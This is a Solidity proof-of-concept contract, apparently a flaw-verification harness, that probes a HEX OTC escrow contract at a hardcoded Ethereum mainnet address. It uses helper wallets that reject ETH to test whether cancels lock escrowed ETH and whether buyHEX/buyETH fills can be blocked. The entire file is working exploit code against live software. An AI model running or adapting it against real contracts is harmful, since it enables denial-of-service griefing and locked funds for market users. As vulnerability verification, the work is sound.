// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlawVerifierERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IFlawVerifierHEXOTC {
    function last_offer_id() external view returns (uint256);

    function offers(uint256 id)
        external
        view
        returns (
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 offerId,
            uint256 escrowType
        );

    function offerETH(uint256 payAmt, uint256 buyAmt) external payable returns (uint256);
    function offerHEX(uint256 payAmt, uint256 buyAmt) external returns (uint256);
    function buyHEX(uint256 id) external payable returns (bool);
    function buyETH(uint256 id) external returns (bool);
    function cancel(uint256 id) external returns (bool);
}

interface IFlawVerifierUniswapV2Router02 {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract RejectETHWallet {
    constructor() payable {}

    receive() external payable {
        revert("reject-eth");
    }

    function approveToken(address token, address spender, uint256 amount) external returns (bool) {
        return IFlawVerifierERC20Like(token).approve(spender, amount);
    }

    function offerETH(address target, uint256 payAmt, uint256 buyAmt) external payable returns (uint256) {
        return IFlawVerifierHEXOTC(target).offerETH{value: msg.value}(payAmt, buyAmt);
    }

    function offerHEX(address target, uint256 payAmt, uint256 buyAmt) external returns (uint256) {
        return IFlawVerifierHEXOTC(target).offerHEX(payAmt, buyAmt);
    }

    function cancel(address target, uint256 id) external returns (bool) {
        return IFlawVerifierHEXOTC(target).cancel(id);
    }

    function buyETH(address target, uint256 id) external returns (bool) {
        return IFlawVerifierHEXOTC(target).buyETH(id);
    }

    function sweepToken(address token, address to) external returns (bool) {
        uint256 amount = IFlawVerifierERC20Like(token).balanceOf(address(this));
        return IFlawVerifierERC20Like(token).transfer(to, amount);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address public constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 internal constant PATH_CANCEL_LOCKS_ETH = 1 << 0;
    uint256 internal constant PATH_BUY_HEX_DOS = 1 << 1;
    uint256 internal constant PATH_BUY_ETH_DOS = 1 << 2;

    uint256 internal constant ONE_HEART = 1;
    uint256 internal constant ONE_WEI = 1;
    uint256 internal constant RESERVED_NATIVE_FOR_PATHS = 3;
    uint256 internal constant SWAP_BUDGET = 0.001 ether;
    uint256 internal constant RECENT_OFFER_SCAN = 128;

    bool private _executed;
    bool private _validated;
    bool private _refuted;
    uint256 private _pathMask;
    address private _profitTokenAddress;
    uint256 private _profitAmountValue;

    constructor() {}

    receive() external payable {}

    function execute() external payable returns (uint256) {
        return _run();
    }

    function run() external payable returns (uint256) {
        return _run();
    }

    function exploit() external payable returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddress;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmountValue;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function hypothesisRefuted() external view returns (bool) {
        return _refuted;
    }

    function exploitPathMask() external view returns (uint256) {
        return _pathMask;
    }

    function _run() internal returns (uint256) {
        if (_executed) {
            return _profitAmountValue;
        }

        _executed = true;
        _validated = false;
        _refuted = false;
        _pathMask = 0;
        _profitTokenAddress = address(0);
        _profitAmountValue = 0;

        if (block.chainid != 1 || TARGET.code.length == 0 || HEX.code.length == 0) {
            _refuted = true;
            return 0;
        }

        _prepareHexInventory();

        bool path0 = _path_contract_wallet_creates_ETH_sell_order_via_offerETH_then_later_cancel_reverts_and_escrow_stays_locked();
        bool path1 = _path_contract_wallet_creates_HEX_sell_order_via_offerHEX_then_buyHEX_reverts_and_order_cannot_be_filled();
        bool path2 = _path_contract_wallet_tries_to_take_an_ETH_order_via_buyETH_then_msg_sender_transfer_reverts();

        if (path0) {
            _pathMask |= PATH_CANCEL_LOCKS_ETH;
        }
        if (path1) {
            _pathMask |= PATH_BUY_HEX_DOS;
        }
        if (path2) {
            _pathMask |= PATH_BUY_ETH_DOS;
        }

        _validated = path0 && path1 && path2;
        _refuted = !_validated;
        return _profitAmountValue;
    }

    function _prepareHexInventory() internal {
        if (IFlawVerifierERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
            return;
        }

        uint256 spendable = address(this).balance;
        if (spendable > RESERVED_NATIVE_FOR_PATHS) {
            uint256 budget = spendable - RESERVED_NATIVE_FOR_PATHS;
            if (budget > SWAP_BUDGET) {
                budget = SWAP_BUDGET;
            }

            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = HEX;

            try IFlawVerifierUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: budget}(
                ONE_HEART, path, address(this), block.timestamp
            ) returns (uint256[] memory) {} catch {}
        }

        if (IFlawVerifierERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
            return;
        }

        uint256 remainingSpend = address(this).balance;
        if (remainingSpend > RESERVED_NATIVE_FOR_PATHS) {
            _buyExistingHexOrder(remainingSpend - RESERVED_NATIVE_FOR_PATHS);
        }
    }

    function _buyExistingHexOrder(uint256 maxSpend) internal {
        (uint256 lastId, bool ok) = _safeLastOfferId();
        if (!ok || lastId == 0 || maxSpend == 0) {
            return;
        }

        uint256 scanned = 0;
        for (uint256 id = lastId; id > 0 && scanned < RECENT_OFFER_SCAN; id--) {
            (bool offerOk, uint256 payAmt, uint256 buyAmt, , uint64 timestamp, uint256 escrowType) = _safeOffer(id);
            if (offerOk && timestamp != 0 && escrowType == 0 && payAmt > 0 && buyAmt > 0 && buyAmt <= maxSpend) {
                try IFlawVerifierHEXOTC(TARGET).buyHEX{value: buyAmt}(id) returns (bool bought) {
                    if (bought && IFlawVerifierERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
                        return;
                    }
                } catch {}
            }
            unchecked {
                scanned++;
            }
        }
    }

    function _path_contract_wallet_creates_ETH_sell_order_via_offerETH_then_later_cancel_reverts_and_escrow_stays_locked()
        internal
        returns (bool)
    {
        if (address(this).balance < ONE_WEI) {
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        RejectETHWallet maker = new RejectETHWallet();

        try maker.offerETH{value: ONE_WEI}(TARGET, ONE_WEI, ONE_HEART) returns (uint256) {} catch {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(maker), ONE_WEI, ONE_HEART, 1);
        if (!created) {
            return false;
        }

        bool cancelReverted = false;
        try maker.cancel(TARGET, id) returns (bool cancelOk) {
            if (!cancelOk) {
                cancelReverted = true;
            }
        } catch {
            cancelReverted = true;
        }

        if (!cancelReverted) {
            return false;
        }

        return _isActiveOffer(id, address(maker), ONE_WEI, ONE_HEART, 1);
    }

    function _path_contract_wallet_creates_HEX_sell_order_via_offerHEX_then_buyHEX_reverts_and_order_cannot_be_filled()
        internal
        returns (bool)
    {
        if (address(this).balance < ONE_WEI || IFlawVerifierERC20Like(HEX).balanceOf(address(this)) < ONE_HEART) {
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        RejectETHWallet seller = new RejectETHWallet();

        if (!IFlawVerifierERC20Like(HEX).transfer(address(seller), ONE_HEART)) {
            return false;
        }
        if (!seller.approveToken(HEX, TARGET, ONE_HEART)) {
            return false;
        }

        try seller.offerHEX(TARGET, ONE_HEART, ONE_WEI) returns (uint256) {} catch {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(seller), ONE_HEART, ONE_WEI, 0);
        if (!created) {
            return false;
        }

        bool buyHexReverted = false;
        try IFlawVerifierHEXOTC(TARGET).buyHEX{value: ONE_WEI}(id) returns (bool fillOk) {
            if (!fillOk) {
                buyHexReverted = true;
            }
        } catch {
            buyHexReverted = true;
        }

        bool orderStillActive = _isActiveOffer(id, address(seller), ONE_HEART, ONE_WEI, 0);

        bool cancelRecovered = false;
        try seller.cancel(TARGET, id) returns (bool cancelOk) {
            cancelRecovered = cancelOk;
        } catch {
            cancelRecovered = false;
        }

        seller.sweepToken(HEX, address(this));

        return buyHexReverted && orderStillActive && cancelRecovered;
    }

    function _path_contract_wallet_tries_to_take_an_ETH_order_via_buyETH_then_msg_sender_transfer_reverts()
        internal
        returns (bool)
    {
        if (address(this).balance < ONE_WEI || IFlawVerifierERC20Like(HEX).balanceOf(address(this)) < ONE_HEART) {
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        try IFlawVerifierHEXOTC(TARGET).offerETH{value: ONE_WEI}(ONE_WEI, ONE_HEART) returns (uint256) {} catch {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(this), ONE_WEI, ONE_HEART, 1);
        if (!created) {
            return false;
        }

        RejectETHWallet taker = new RejectETHWallet();

        if (!IFlawVerifierERC20Like(HEX).transfer(address(taker), ONE_HEART)) {
            return false;
        }
        if (!taker.approveToken(HEX, TARGET, ONE_HEART)) {
            return false;
        }

        bool buyEthReverted = false;
        try taker.buyETH(TARGET, id) returns (bool fillOk) {
            if (!fillOk) {
                buyEthReverted = true;
            }
        } catch {
            buyEthReverted = true;
        }

        bool orderStillActive = _isActiveOffer(id, address(this), ONE_WEI, ONE_HEART, 1);

        bool cancelRecovered = false;
        try IFlawVerifierHEXOTC(TARGET).cancel(id) returns (bool cancelOk) {
            cancelRecovered = cancelOk;
        } catch {
            cancelRecovered = false;
        }

        taker.sweepToken(HEX, address(this));

        return buyEthReverted && orderStillActive && cancelRecovered;
    }

    function _detectFreshOffer(uint256 beforeId, address owner, uint256 payAmt, uint256 buyAmt, uint256 escrowType)
        internal
        view
        returns (uint256 id, bool created)
    {
        (uint256 afterId, bool okAfter) = _safeLastOfferId();
        if (!okAfter || afterId <= beforeId) {
            return (0, false);
        }

        id = afterId;
        created = _isActiveOffer(id, owner, payAmt, buyAmt, escrowType);
    }

    function _isActiveOffer(uint256 id, address owner, uint256 payAmt, uint256 buyAmt, uint256 escrowType)
        internal
        view
        returns (bool)
    {
        (bool ok, uint256 offerPayAmt, uint256 offerBuyAmt, address offerOwner, uint64 timestamp, uint256 offerEscrowType) =
            _safeOffer(id);
        return ok && timestamp != 0 && offerOwner == owner && offerPayAmt == payAmt && offerBuyAmt == buyAmt
            && offerEscrowType == escrowType;
    }

    function _safeLastOfferId() internal view returns (uint256 value, bool ok) {
        try IFlawVerifierHEXOTC(TARGET).last_offer_id() returns (uint256 lastId) {
            return (lastId, true);
        } catch {
            return (0, false);
        }
    }

    function _safeOffer(uint256 id)
        internal
        view
        returns (
            bool ok,
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            uint256 escrowType
        )
    {
        try IFlawVerifierHEXOTC(TARGET).offers(id) returns (
            uint256 offerPayAmt,
            uint256 offerBuyAmt,
            address offerOwner,
            uint64 offerTimestamp,
            bytes32,
            uint256 offerEscrowType
        ) {
            return (true, offerPayAmt, offerBuyAmt, offerOwner, offerTimestamp, offerEscrowType);
        } catch {
            return (false, 0, 0, address(0), 0, 0);
        }
    }
}
